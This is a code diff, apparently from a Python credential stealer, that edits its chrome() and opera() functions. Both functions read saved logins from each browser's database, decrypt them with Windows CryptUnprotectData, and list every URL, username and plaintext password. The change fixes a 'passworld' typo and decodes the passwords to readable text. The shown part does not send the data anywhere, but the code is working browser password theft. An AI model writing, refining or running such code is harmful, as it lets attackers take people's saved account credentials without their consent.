@@ -21,8 +21,7 @@ def chrome():
         for result in cursor.fetchall():
             password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
             if password:
-                output = output + "\n" + "url: " + result[0] + "  |  login: " + result[1] + "  |  passworld: " + str(
-                    password)
+                output = output + "\n" + "url: " + result[0] + "  |  login: " + result[1] + "  |  password: " + password.decode("utf-8") 
     except:
         return "chrome didn't installed"
     return (output)
@@ -42,8 +41,7 @@ def opera():
         for result in cursor.fetchall():
             password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
             if password:
-                output = output + "\n" + "url: " + result[0] + "  |  login: " + result[1] + "  |  passworld: " + str(
-                    password)
+                output = output + "\n" + "url: " + result[0] + "  |  login: " + result[1] + "  |  password: " + password.decode("utf-8") 
     except:
         return "opera didn't installed"
     return (output)
